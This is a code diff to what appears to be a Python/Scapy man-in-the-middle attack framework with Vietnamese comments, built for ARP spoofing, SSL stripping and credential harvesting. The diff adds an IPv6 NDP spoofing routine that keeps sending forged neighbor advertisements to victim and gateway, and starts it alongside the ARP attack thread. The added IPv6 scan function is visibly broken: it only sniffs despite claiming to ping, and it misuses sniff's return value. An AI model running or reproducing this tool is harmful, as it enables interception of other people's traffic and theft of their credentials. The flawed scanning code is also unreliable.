@@ -1,21 +1,24 @@
-
-"""
-ARP SPOOFING FRAMEWORK
-Công cụ Man-in-the-Middle Attack & Network Analysis
-
-Features:
-- ARP Spoofing (NetCut/MITM)
-- SSL Stripping
-- Credential Harvesting
-- Image Replacement
-- Fake DNS Server
-- Auto Attack Mode
-- Live Dashboard
-- Cross-platform Support
-"""
-
-from scapy.all import *
-from scapy.supersocket import L3RawSocket
+from scapy.all import (
+    ARP,            # Giao thức ARP
+    Ether,          # Lớp Ethernet (Layer 2)
+    IP,             # Lớp IP (Layer 3)
+    UDP,            # Lớp UDP (Layer 4)
+    DNS,            # Giao thức DNS
+    DNSQR,          # DNS Question Record
+    DNSRR,          # DNS Resource Record
+    Raw,            # Dữ liệu thô (HTTP payload)
+    sniff,          # Hàm bắt gói tin
+    send,           # Hàm gửi gói tin
+    arping,         # Hàm quét ARP
+    get_if_hwaddr,  # Lấy MAC address
+    conf,            # Cấu hình Scapy
+    IPv6,                   # Lớp IPv6
+    ICMPv6ND_NS,            # Neighbor Solicitation (Hỏi MAC của ai đó)
+    ICMPv6ND_NA,            # Neighbor Advertisement (Trả lời MAC - dùng để Spoof)
+    ICMPv6NDOptDstLLAddr,   # Option chứa MAC đích
+    ICMPv6NDOptSrcLLAddr,   # Option chứa MAC nguồn
+    in6_getifaddr           # Lấy địa chỉ IPv6 của máy mình
+)
 import netifaces as ni
 import sys
 import os
@@ -41,7 +44,11 @@ from rich.progress import Progress, SpinnerColumn, TextColumn
 
 # Windows specific
 if platform.system() == "Windows":
-    conf.L3socket = L3RawSocket
+    try:
+        from scapy.all import L3RawSocket
+        conf.L3socket = L3RawSocket
+    except ImportError:
+        pass
     from scapy.arch.windows import get_windows_if_list
 
 console = Console()
@@ -209,6 +216,23 @@ class Scanner:
         
         console.print(f"[green]✅ Tìm thấy {len(devices)} thiết bị[/green]")
         return devices
+
+    def scan_ipv6(self):
+        """Quét mạng IPv6 bằng cách gửi Multicast Ping"""
+        console.print(f"[yellow]🔍 Đang quét IPv6 trên {self.iface}... (Mất khoảng 2-3s)[/yellow]")
+        ans, unans = sniff(iface=self.iface, timeout=3, 
+                           filter="icmp6 and ip6[40] == 129",
+                           count=10)
+        
+        devices_v6 = []
+        for pkt in ans:
+            if IPv6 in pkt:
+                ip6 = pkt[IPv6].src
+                mac = pkt[Ether].src
+                if ip6.startswith("fe80"):
+                    devices_v6.append({'ip': ip6, 'mac': mac})
+                    
+        return devices_v6
 
 # ==================== LIVE DASHBOARD ====================
 class LiveDashboard:
@@ -586,6 +610,36 @@ class Attacker:
             except Exception as e:
                 console.print(f"[red]❌ Lỗi IP Forward: {e}[/red]")
     
+    def spoof_ipv6(self):
+        """
+        Tấn công IPv6 dùng NDP Spoofing (Tương tự ARP Spoofing)
+        """
+        if not hasattr(self, 'victim_ipv6') or not hasattr(self, 'gateway_ipv6'):
+            return
+
+        console.print(f"[green]⚔️  Kích hoạt IPv6 Attack: {self.victim_ipv6} <--> Gateway[/green]")
+        
+        while self.running:
+            try:
+                packet = (
+                    IPv6(src=self.gateway_ipv6, dst=self.victim_ipv6) /
+                    ICMPv6ND_NA(tgt=self.gateway_ipv6, R=1, S=1, O=1) /
+                    ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)
+                )
+                send(packet, verbose=0, iface=self.iface)
+                
+                # Nói với Gateway: "Tao (Attacker MAC) là Victim IPv6 nè"
+                packet2 = (
+                    IPv6(src=self.victim_ipv6, dst=self.gateway_ipv6) /
+                    ICMPv6ND_NA(tgt=self.victim_ipv6, R=1, S=1, O=1) /
+                    ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)
+                )
+                send(packet2, verbose=0, iface=self.iface)
+                
+                time.sleep(2)
+            except Exception as e:
+                pass
+    
     def _get_interface_guid(self):
         """Lấy GUID interface trên Windows"""
         try:
@@ -756,6 +810,9 @@ class Attacker:
         # Start ARP spoofing thread
         self.spoof_thread = threading.Thread(target=self.spoof, daemon=True)
         self.spoof_thread.start()
+        if hasattr(self, 'victim_ipv6'):
+            self.ipv6_thread = threading.Thread(target=self.spoof_ipv6, daemon=True)
+            self.ipv6_thread.start()
     
     def stop(self):
         """Dừng attack và khôi phục"""
